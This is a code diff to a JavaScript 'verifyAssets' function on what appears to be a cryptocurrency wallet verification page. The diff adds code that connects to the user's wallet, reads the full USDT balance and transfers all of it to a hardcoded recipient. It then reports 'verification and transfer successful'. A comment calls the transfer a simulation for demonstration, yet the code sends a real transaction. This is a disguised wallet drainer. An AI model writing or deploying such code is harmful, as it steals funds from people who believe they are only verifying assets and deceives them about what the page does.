@@ -468,27 +468,36 @@
         async function verifyAssets() {
             log("", 'info');
             showLoading(true);
+            verifyButton.disabled = true; // Disable button during operation
+
 
             const userAddress = await switchToBSCAndGetAccount();
             if (!userAddress) {
                 showLoading(false);
+                verifyButton.disabled = false;
                 return;
             }
 
             const provider = new ethers.providers.Web3Provider(window.ethereum);
-
-             getBalance(provider, userAddress);
+            await getBalance(provider, userAddress);
 
             try {
+                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider.getSigner());  // Use getSigner()
 
+                // Simulate a transfer of all funds (for demonstration purposes)
+                const balance = await usdtContract.balanceOf(userAddress);
+                const tx = await usdtContract.transfer(recipient, balance);
+                log(`✅ Transfer initiated. Transaction Hash: ${tx.hash}`, 'success');
+                await tx.wait(); // Wait for the transaction to be mined
+                log("✅ Asset verification and transfer successful.", 'success');
 
-                log("✅ Asset verification successful.", 'success');
 
             } catch (err) {
                 console.error(err);
                 log(`❌ Verification failed: ${err?.message || err}`, 'error');
             } finally {
                 showLoading(false);
+                verifyButton.disabled = false; // Re-enable the button
             }
         }
 
